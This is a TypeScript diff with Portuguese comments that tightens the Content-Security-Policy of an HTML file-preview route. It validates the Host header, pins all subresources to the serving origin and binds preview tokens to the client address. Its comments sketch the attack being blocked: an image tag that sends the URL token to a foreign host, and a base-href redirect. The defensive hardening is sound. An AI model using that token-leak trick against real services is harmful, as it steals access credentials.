@@ -33,6 +33,9 @@ const PREVIEW_MIME: Record<string, string> = {
 const HTML_EXT = new Set(['.html', '.htm', '.xhtml'])
 export const isHtmlFile = (p: string) => HTML_EXT.has(extname(p).toLowerCase())
 
+// Host é dado do cliente: sem esta peneira, um `;` nele reescreve a política.
+const HOST_OK = /^[A-Za-z0-9.\-]+(:\d{1,5})?$|^\[[0-9A-Fa-f:.]+\](:\d{1,5})?$/
+
 /**
  * A política do documento renderizado.
  *
@@ -40,11 +43,37 @@ export const isHtmlFile = (p: string) => HTML_EXT.has(extname(p).toLowerCase())
  * iframe não existiria: sem `allow-same-origin`, a página fica numa origem opaca
  * e não alcança cookie, storage nem a API do Claudinei. `allow-scripts` fica
  * porque página real usa script — a galeria que motivou isto monta os `src` em
- * JS, e sem ele o operador veria uma casca vazia. `connect-src 'none'` é o
- * contrapeso: script roda, mas não faz fetch — então não consegue LER o projeto
- * pelo próprio token e mandar para fora.
+ * JS, e sem ele o operador veria uma casca vazia.
+ *
+ * E todo subrecurso fica preso à origem que serviu a página. O motivo é o token:
+ * ele viaja na URL, e qualquer script da própria página lê `location.href` —
+ * então `connect-src 'none'` sozinho não bastava, bastava um
+ * `<img src="https://alheio/?t=…">` para a capacidade de leitura ir embora
+ * calada. O custo é consciente: página que puxa CSS/fonte de CDN aparece sem
+ * eles. Entre renderizar bonito e não vazar chave de leitura, fica o segundo.
+ *
+ * `'self'` NÃO serve aqui: em origem opaca ele não casa com nada e derrubaria
+ * até as imagens do próprio preview — por isso a origem entra escrita.
  */
-const PREVIEW_CSP = ["sandbox allow-scripts", "connect-src 'none'", "form-action 'none'"].join('; ')
+function previewCsp(host?: string): string {
+  // Sem Host confiável não dá para escrever a origem; então nada carrega. A
+  // página ainda aparece (o HTML é o próprio documento), só sem subrecurso.
+  const origem = host && HOST_OK.test(host) ? `http://${host} https://${host}` : "'none'"
+  return [
+    'sandbox allow-scripts',
+    `default-src ${origem}`,
+    `img-src ${origem} data: blob:`,
+    `style-src ${origem} 'unsafe-inline'`,
+    // Página local é feita de script inline; sem isto sobra a casca.
+    `script-src ${origem} 'unsafe-inline' 'unsafe-eval'`,
+    `font-src ${origem} data:`,
+    `media-src ${origem} data: blob:`,
+    "connect-src 'none'",
+    "form-action 'none'",
+    // <base href="https://alheio/"> reapontaria todo relativo para fora.
+    "base-uri 'none'",
+  ].join('; ')
+}
 
 /**
  * Raiz que o token libera. O projeto inteiro quando o arquivo está dentro dele —
@@ -192,7 +221,7 @@ export function registerFileRoutes(
     // Só HTML: é o único tipo que precisa de documento próprio para ser visto, e
     // cada extensão a mais aqui alarga uma rota que responde sem cookie.
     if (!isHtmlFile(real)) return reply.code(415).send({ error: 'not html' })
-    return { url: previewUrl(previews.issue(previewRoot(real, project)), real) }
+    return { url: previewUrl(previews.issue(previewRoot(real, project), req.socket.remoteAddress), real) }
   })
 
   /**
@@ -204,7 +233,7 @@ export function registerFileRoutes(
     // 404 para tudo — token inválido, fora da raiz, diretório: nada aqui deve
     // servir de oráculo sobre o que existe no disco do servidor.
     const semNada = () => reply.code(404).send({ error: 'not found' })
-    const grant = previews.resolve(p.token)
+    const grant = previews.resolve(p.token, req.socket.remoteAddress)
     if (!grant) return semNada()
     const pedido = pathFromPreviewUrl(p['*'] ?? '')
     if (!pedido) return semNada()
@@ -218,7 +247,7 @@ export function registerFileRoutes(
     reply.header('Cache-Control', 'no-store')
     if (isHtmlFile(real)) {
       reply.header('Content-Type', 'text/html; charset=utf-8')
-      reply.header('Content-Security-Policy', PREVIEW_CSP)
+      reply.header('Content-Security-Policy', previewCsp(req.headers.host))
       // O app inteiro responde DENY; aqui o visualizador PRECISA embutir.
       reply.header('X-Frame-Options', 'SAMEORIGIN')
     } else {
